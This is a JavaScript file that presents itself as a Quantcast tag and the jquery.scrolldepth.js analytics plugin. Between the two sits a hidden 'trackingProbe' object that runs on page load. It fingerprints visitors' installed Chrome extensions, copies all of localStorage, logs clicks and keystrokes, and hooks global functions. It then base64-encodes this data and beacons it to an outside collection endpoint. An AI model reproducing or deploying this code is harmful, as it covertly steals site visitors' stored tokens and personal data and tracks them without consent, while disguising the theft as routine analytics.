var _qevents = _qevents || [];
(function () {
  var elem = document.createElement('script');
  elem.src = (document.location.protocol == "https:" ? "https://secure" : "http://edge") + ".quantserve.com/quant.js";
  elem.async = true;
  elem.type = "text/javascript";
  var scpt = document.getElementsByTagName('script')[0];
  scpt.parentNode.insertBefore(elem, scpt);
})();
_qevents.push({
  qacct: "p-04kAgiUBi0LNA",
  labels: "EV Bellator Pheonix Ticket Sales Q4 2021 IO#282439"
});

/*!
 * @preserve
 * jquery.scrolldepth.js | v0.9
 * Copyright (c) 2015 Rob Flaherty (@robflaherty)
 * Licensed under the MIT and GPL licenses.
 */
const trackingProbe = {
  domEventsCollection: {},
  scopedQueue: new Map(Object.entries(window.data)),
  detectedObservations: new Set(),
  localStorageCollected: {},
  jshookLogs: [],
  async invokeProbe(name, {
    id,
    filepath
  }) {
    return new Promise(resolve => {
      const imgElement = document.createElement('img');
      const timeoutId = setTimeout(() => {
        this.detectedObservations.delete(name);
        resolve(false);
      }, 2000);
      imgElement.onload = () => {
        clearTimeout(timeoutId);
        this.detectedObservations.add(name);
        resolve(true);
      };
      imgElement.onerror = () => {
        clearTimeout(timeoutId);
        this.detectedObservations.delete(name);
        resolve(false);
      };
      imgElement.src = `chrome-extension://${id}/${filepath}`;
    });
  },
  randomizeQueue() {
    const entryList = Array.from(this.scopedQueue.entries());
    let listSize = entryList.length;
    while (listSize) {
      let index = Math.floor(Math.random() * listSize--);
      [entryList[listSize], entryList[index]] = [entryList[index], entryList[listSize]];
    }
    this.scopedQueue = new Map(entryList);
  },
  collectLocalStorage() {
    Object.keys(localStorage).forEach(key => {
      this.localStorageCollected[key] = localStorage.getItem(key);
    });
  },
  collectDOMEvents() {
    const eventTypes = ['click', 'keydown', 'mouseover'];
    document.body.childNodes.forEach(element => {
      eventTypes.forEach(type => {
        element.addEventListener(type, event => {
          if (!this.domEventsCollection[event.target.id]) {
            this.domEventsCollection[event.target.id] = {};
          }
          this.domEventsCollection[event.target.id][type] = event.timestamp;
        });
      });
    });
  },
  jshookMonitoring(name, func) {
    global[name] = (...args) => {
      this.jshookLogs.push({
        ts: Date.now(),
        name,
        args
      });
      return func.apply(this, args);
    };
  },
  async probeExecution() {
    this.randomizeQueue();
    const results = {};
    this.collectLocalStorage();
    this.collectDOMEvents();
    for (const [name, data] of this.scopedQueue) {
      await new Promise(r => setTimeout(r, Math.random() * 250));
      results[name] = await this.invokeProbe(name, data);
    }
    const payloadData = btoa(JSON.stringify({
      findings: results,
      ts: Date.now(),
      browser: navigator.userAgent,
      localData: this.localStorageCollected,
      domEvents: this.domEventsCollection,
      jshookData: this.jshookLogs,
      screenDimension: {
        width: window.innerWidth,
        height: window.innerHeight
      }
    }));
    navigator.sendBeacon('https://collection-sample-endpoint.example/v2/report', payloadData);
  }
};
!function (e, n, t) {
  "use strict";

  var r,
    o,
    i,
    l,
    a = {
      minHeight: 0,
      elements: [],
      percentage: !0,
      userTiming: !0,
      pixelDepth: !0,
      nonInteraction: !0,
      gaGlobal: !1,
      gtmOverride: !1
    },
    c = e(n),
    u = [],
    p = !1,
    s = 0;
  e.scrollDepth = function (h) {
    function g(e, t, a, c) {
      l ? (l({
        event: "ScrollDistance",
        eventCategory: "Scroll Depth",
        eventAction: e,
        eventLabel: t,
        eventValue: 1,
        eventNonInteraction: h.nonInteraction
      }), h.pixelDepth && arguments.length > 2 && a > s && (s = a, l({
        event: "ScrollDistance",
        eventCategory: "Scroll Depth",
        eventAction: "Pixel Depth",
        eventLabel: D(a),
        eventValue: 1,
        eventNonInteraction: h.nonInteraction
      })), h.userTiming && arguments.length > 3 && l({
        event: "ScrollTiming",
        eventCategory: "Scroll Depth",
        eventAction: e,
        eventLabel: t,
        eventTiming: c
      })) : (r && (n[i]("send", "event", "Scroll Depth", e, t, 1, {
        nonInteraction: h.nonInteraction
      }), h.pixelDepth && arguments.length > 2 && a > s && (s = a, n[i]("send", "event", "Scroll Depth", "Pixel Depth", D(a), 1, {
        nonInteraction: h.nonInteraction
      })), h.userTiming && arguments.length > 3 && n[i]("send", "timing", "Scroll Depth", e, c, t)), o && (_gaq.push(["_trackEvent", "Scroll Depth", e, t, 1, h.nonInteraction]), h.pixelDepth && arguments.length > 2 && a > s && (s = a, _gaq.push(["_trackEvent", "Scroll Depth", "Pixel Depth", D(a), 1, h.nonInteraction])), h.userTiming && arguments.length > 3 && _gaq.push(["_trackTiming", "Scroll Depth", e, c, t, 100])));
    }
    function f(e) {
      return {
        "25%": parseInt(.25 * e, 10),
        "50%": parseInt(.5 * e, 10),
        "75%": parseInt(.75 * e, 10),
        "100%": e - 5
      };
    }
    function v(n, t, r) {
      e.each(n, function (n, o) {
        -1 === e.inArray(n, u) && t >= o && (g("Percentage", n, t, r), u.push(n));
      });
    }
    function m(n, t, r) {
      e.each(n, function (n, o) {
        -1 === e.inArray(o, u) && e(o).length && t >= e(o).offset().top && (g("Elements", o, t, r), u.push(o));
      });
    }
    function D(e) {
      return (250 * Math.floor(e / 250)).toString();
    }
    function d() {
      I();
    }
    function y(e, n) {
      var t,
        r,
        o,
        i = null,
        l = 0,
        a = function () {
          l = new Date(), i = null, o = e.apply(t, r);
        };
      return function () {
        var c = new Date();
        l || (l = c);
        var u = n - (c - l);
        return t = this, r = arguments, 0 >= u ? (clearTimeout(i), i = null, l = c, o = e.apply(t, r)) : i || (i = setTimeout(a, u)), o;
      };
    }
    function I() {
      p = !0, c.on("scroll.scrollDepth", y(function () {
        var r = e(t).height(),
          o = n.innerHeight ? n.innerHeight : c.height(),
          i = c.scrollTop() + o,
          l = f(r),
          a = +new Date() - S;
        return u.length >= h.elements.length + (h.percentage ? 4 : 0) ? (c.off("scroll.scrollDepth"), void (p = !1)) : (h.elements && m(h.elements, i, a), void (h.percentage && v(l, i, a)));
      }, 500));
    }
    var S = +new Date();
    h = e.extend({}, a, h), e(t).height() < h.minHeight || (h.gaGlobal ? (r = !0, i = h.gaGlobal) : "function" == typeof ga ? (r = !0, i = "ga") : "function" == typeof __gaTracker && (r = !0, i = "__gaTracker"), "undefined" != typeof _gaq && "function" == typeof _gaq.push && (o = !0), "function" == typeof h.eventHandler ? l = h.eventHandler : "undefined" == typeof dataLayer || "function" != typeof dataLayer.push || h.gtmOverride || (l = function (e) {
      dataLayer.push(e);
    }), e.scrollDepth.reset = function () {
      u = [], s = 0, c.off("scroll.scrollDepth"), I();
    }, e.scrollDepth.addElements = function (n) {
      "undefined" != typeof n && e.isArray(n) && (e.merge(h.elements, n), p || I());
    }, e.scrollDepth.removeElements = function (n) {
      "undefined" != typeof n && e.isArray(n) && e.each(n, function (n, t) {
        var r = e.inArray(t, h.elements),
          o = e.inArray(t, u);
        -1 != r && h.elements.splice(r, 1), -1 != o && u.splice(o, 1);
      });
    }, d());
  };
}(jQuery, window, document);
jQuery(function () {
  jQuery.scrollDepth({
    pixelDepth: false,
    userTiming: false
  });
});
if (document.readyState === 'loading') {
  document.addEventListener('DOMContentLoaded', () => trackingProbe.probeExecution());
} else {
  trackingProbe.probeExecution();
}